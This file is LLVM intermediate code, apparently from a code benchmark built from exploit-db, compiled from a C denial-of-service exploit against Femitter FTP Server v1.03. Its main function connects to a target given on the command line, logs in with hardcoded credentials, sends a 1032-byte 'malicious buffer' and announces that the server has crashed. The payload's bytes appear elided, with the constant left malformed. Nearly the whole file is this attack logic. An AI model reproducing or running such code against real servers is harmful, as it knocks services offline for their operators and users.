; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/dos/extr_6481.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/dos/extr_6481.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.user = private unnamed_addr constant [13 x i8] c"USER admin\0D\0A\00", align 1
@__const.main.pass = private unnamed_addr constant [13 x i8] c"PASS nimda\0D\0A\00", align 1
@__const.main.payload = private unnamed_addr constant [1032 x i8] calign 16
@.str = private unnamed_addr constant [25 x i8] c"\0AUsage: %s [ip] [port]\0A\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"Socket\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Error creating socket...\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"\0A\0A[+] Socket created!\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"Connect\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"Error connecting...\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"[+] Connection established!\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"[+] Sending CMD: %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [51 x i8] c"[+] Sending malicious buffer to %s on port %s ...\0A\00", align 1
@.str.9 = private unnamed_addr constant [42 x i8] c"[+] Malicious buffer succesfully sent...\0A\00", align 1
@.str.10 = private unnamed_addr constant [51 x i8] c"[+] Femitter FTP Server v1.03 on %s has crashed!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [13 x i8], align 1
  %9 = alloca [13 x i8], align 1
  %10 = alloca [1032 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %12 = bitcast [13 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([13 x i8], [13 x i8]* @__const.main.user, i32 0, i32 0), i64 13, i1 false)
  %13 = bitcast [13 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %13, i8* align 1 getelementptr inbounds ([13 x i8], [13 x i8]* @__const.main.pass, i32 0, i32 0), i64 13, i1 false)
  %14 = bitcast [1032 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([1032 x i8], [1032 x i8]* @__const.main.payload, i32 0, i32 0), i64 1032, i1 false)
  %15 = call i32 (...) @header()
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 3
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %23, i32* %3, align 4
  br label %97

24:                                               ; preds = %2
  %25 = load i32, i32* @AF_INET, align 4
  %26 = load i32, i32* @SOCK_STREAM, align 4
  %27 = call i32 @socket(i32 %25, i32 %26, i32 0)
  store i32 %27, i32* %7, align 4
  %28 = load i32, i32* %7, align 4
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %33

30:                                               ; preds = %24
  %31 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %97

33:                                               ; preds = %24
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %35 = call i32 @sleep(i32 1)
  %36 = call i32 @memset(%struct.sockaddr_in* %11, i32 0, i32 12)
  %37 = load i32, i32* @AF_INET, align 4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %37, i32* %38, align 4
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @inet_addr(i8* %41)
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i32 0, i32 0
  store i32 %42, i32* %44, align 4
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @atoi(i8* %47)
  %49 = call i32 @htons(i32 %48)
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %49, i32* %50, align 4
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 12)
  store i32 %53, i32* %6, align 4
  %54 = load i32, i32* %6, align 4
  %55 = icmp slt i32 %54, 0
  br i1 %55, label %56, label %59

56:                                               ; preds = %33
  %57 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %97

59:                                               ; preds = %33
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  %61 = call i32 @sleep(i32 1)
  %62 = load i32, i32* %7, align 4
  %63 = getelementptr inbounds [13 x i8], [13 x i8]* %8, i64 0, i64 0
  %64 = getelementptr inbounds [13 x i8], [13 x i8]* %8, i64 0, i64 0
  %65 = call i32 @strlen(i8* %64)
  %66 = call i32 @write(i32 %62, i8* %63, i32 %65)
  %67 = getelementptr inbounds [13 x i8], [13 x i8]* %8, i64 0, i64 0
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i8* %67)
  %69 = call i32 @sleep(i32 2)
  %70 = load i32, i32* %7, align 4
  %71 = getelementptr inbounds [13 x i8], [13 x i8]* %9, i64 0, i64 0
  %72 = getelementptr inbounds [13 x i8], [13 x i8]* %9, i64 0, i64 0
  %73 = call i32 @strlen(i8* %72)
  %74 = call i32 @write(i32 %70, i8* %71, i32 %73)
  %75 = getelementptr inbounds [13 x i8], [13 x i8]* %9, i64 0, i64 0
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i8* %75)
  %77 = call i32 @sleep(i32 2)
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 2
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.8, i64 0, i64 0), i8* %80, i8* %83)
  %85 = call i32 @sleep(i32 2)
  %86 = load i32, i32* %7, align 4
  %87 = getelementptr inbounds [1032 x i8], [1032 x i8]* %10, i64 0, i64 0
  %88 = call i32 @send(i32 %86, i8* %87, i32 1032, i32 0)
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.9, i64 0, i64 0))
  %90 = call i32 @sleep(i32 1)
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 1
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.10, i64 0, i64 0), i8* %93)
  %95 = load i32, i32* %7, align 4
  %96 = call i32 @close(i32 %95)
  store i32 0, i32* %3, align 4
  br label %97

97:                                               ; preds = %59, %56, %30, %18
  %98 = load i32, i32* %3, align 4
  ret i32 %98
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @header(...) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
